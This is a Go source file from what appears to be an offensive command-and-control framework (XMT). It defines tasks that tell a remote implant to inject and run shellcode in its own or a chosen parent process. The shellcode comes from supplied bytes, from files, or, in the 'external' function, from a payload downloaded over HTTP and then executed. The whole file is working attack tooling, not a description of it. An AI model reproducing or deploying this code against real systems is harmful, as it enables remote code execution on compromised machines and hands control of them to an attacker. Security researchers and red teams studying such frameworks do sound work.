package task

import (
	"context"
	"io"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
)

// Assembly is a struct that is similar to the 'cmd.Assembly' struct. This is
// used to Task a Client with running shellcode on devices. This struct has many
// of the functionallies of the standard 'cmd.Assembly' functions.
//
// The 'SetParent' function will attempt to set the target that runs the shellcode.
// If none are specified, the shellcode will be injected into the client process.
type Assembly struct {
	Filter *cmd.Filter

	Path string
	Data []byte

	Timeout time.Duration
	Wait    bool
}

// Inject will create a Task that will instruct the client to run shellcode.
//
// This command will run under the current process and will wait until completion.
// Use the 'InjectEx' function instead to change this behavior.
//
// C2 Details:
//  ID: TvAssembly
//
//  Input:
//      - task.Assembly struct
//        - bool (Wait)
//        - int64 (Timeout)
//        - string (Path)
//        - bool (Filer != nil)
//        - Filter
//        - []byte (Data)
//  Output:
//      - uint64 (handle)
//      - uint32 (pid)
//      - int32 (exit code)
func Inject(b []byte) *com.Packet {
	return InjectEx(&Assembly{Data: b})
}

// InjectEx will create a Task that will instruct the client to run the shellcode
// and options specified in the Assembly struct.
//
// C2 Details:
//  ID: TvAssembly
//
//  Input:
//      - task.Assembly struct
//        - bool (Wait)
//        - int64 (Timeout)
//        - string (Path)
//        - bool (Filer != nil)
//        - Filter
//        - []byte (Data)
//  Output:
//      - uint64 (handle)
//      - uint32 (pid)
//      - int32 (exit code)
func InjectEx(a *Assembly) *com.Packet {
	if a == nil {
		return nil
	}
	n := &com.Packet{ID: TvAssembly}
	a.MarshalStream(n)
	return n
}

// InjectPath will create a Task that will instruct the client to run shellcode
// from a file source on the remote (client) machine.
//
// The target path may contain environment variables that will be resolved during
// runtime.
//
// This command will run under the current process and will wait until completion.
// Use the 'InjectEx' function instead to change this behavior.
//
// C2 Details:
//  ID: WvInjectDLL
//
//  Input:
//      - task.Assembly struct
//        - bool (Wait)
//        - int64 (Timeout)
//        - string (Path)
//        - bool (Filer != nil)
//        - Filter
//        - []byte (Data)
//  Output:
//      - uint64 (handle)
//      - uint32 (pid)
//      - int32 (exit code)
func InjectPath(s string) *com.Packet {
	return InjectEx(&Assembly{Path: s})
}

// InjectFile will create a Task that will instruct the client to run shellcode
// from a file source on the local (server) machine.
//
// This command will run under the current process and will wait until completion.
// Use the 'InjectEx' function instead to change this behavior.
//
// C2 Details:
//  ID: TvAssembly
//
//  Input:
//      - task.Assembly struct
//        - bool (Wait)
//        - int64 (Timeout)
//        - string (Path)
//        - bool (Filer != nil)
//        - Filter
//        - []byte (Data)
//  Output:
//      - uint64 (handle)
//      - uint32 (pid)
//      - int32 (exit code)
func InjectFile(s string) (*com.Packet, error) {
	b, err := os.ReadFile(s)
	if err != nil {
		return nil, err
	}
	return Inject(b), nil
}

// InjectReader will create a Task that will instruct the client to run shellcode
// from a reader source on the local (server) machine.
//
// This command will run under the current process and will wait until completion.
// Use the 'InjectEx' function instead to change this behavior.
//
// C2 Details:
//  ID: TvAssembly
//
//  Input:
//      - task.Assembly struct
//        - bool (Wait)
//        - int64 (Timeout)
//        - string (Path)
//        - bool (Filer != nil)
//        - Filter
//        - []byte (Data)
//  Output:
//      - uint64 (handle)
//      - uint32 (pid)
//      - int32 (exit code)
func InjectReader(r io.Reader) (*com.Packet, error) {
	b, err := io.ReadAll(r)
	if err != nil {
		return nil, err
	}
	return Inject(b), nil
}

// MarshalStream writes the data for this Code thread to the supplied Writer.
func (a *Assembly) MarshalStream(w data.Writer) error {
	if err := w.WriteBool(a.Wait); err != nil {
		return err
	}
	if err := w.WriteInt64(int64(a.Timeout)); err != nil {
		return err
	}
	if err := w.WriteString(a.Path); err != nil {
		return err
	}
	if a.Filter != nil {
		if err := w.WriteBool(true); err != nil {
			return err
		}
		if err := a.Filter.MarshalStream(w); err != nil {
			return err
		}
	} else {
		if err := w.WriteBool(false); err != nil {
			return err
		}
	}
	if err := w.WriteBytes(a.Data); err != nil {
		return err
	}
	return nil
}

// UnmarshalStream reads the data for this Code thread from the supplied Reader.
func (a *Assembly) UnmarshalStream(r data.Reader) error {
	if err := r.ReadBool(&a.Wait); err != nil {
		return err
	}
	if err := r.ReadInt64((*int64)(&a.Timeout)); err != nil {
		return err
	}
	if err := r.ReadString(&a.Path); err != nil {
		return err
	}
	if f, err := r.Bool(); err != nil {
		return err
	} else if f {
		a.Filter = new(cmd.Filter)
		if err = a.Filter.UnmarshalStream(r); err != nil {
			return err
		}
	}
	if err := r.ReadBytes(&a.Data); err != nil {
		return err
	}
	return nil
}
func assembly(x context.Context, r data.Reader, w data.Writer) error {
	var (
		a   Assembly
		err = a.UnmarshalStream(r)
	)
	if err != nil {
		return err
	}
	var c *cmd.Assembly
	if len(a.Path) > 0 {
		b, err2 := external(x, a.Timeout, a.Path)
		if err2 != nil {
			return err2
		}
		c = cmd.NewAsmContext(x, b)
	} else {
		c = cmd.NewAsmContext(x, a.Data)
	}
	c.Timeout = a.Timeout
	c.SetParent(a.Filter)
	if err = c.Start(); err != nil {
		return err
	}
	h, _ := c.Handle()
	w.WriteUint64(uint64(h))
	if w.WriteUint32(c.Pid()); !a.Wait {
		w.WriteInt32(0)
		return nil
	}
	err = c.Wait()
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		return err
	}
	e, _ := c.ExitCode()
	w.WriteInt32(e)
	return nil
}
func external(x context.Context, d time.Duration, s string) ([]byte, error) {
	if strings.HasPrefix(s, "http") {
		var (
			c context.Context
			f context.CancelFunc
		)
		if d > 0 {
			c, f = context.WithTimeout(x, d)
		} else {
			c, f = x, func() {}
		}
		var (
			r, _   = http.NewRequestWithContext(c, http.MethodGet, s, nil)
			o, err = request(r)
		)
		if err != nil {
			f()
			return nil, err
		}
		b, err := io.ReadAll(o.Body)
		o.Body.Close()
		o, r = nil, nil
		if f(); err != nil {
			return nil, err
		}
		return b, nil
	}
	return os.ReadFile(s)
}
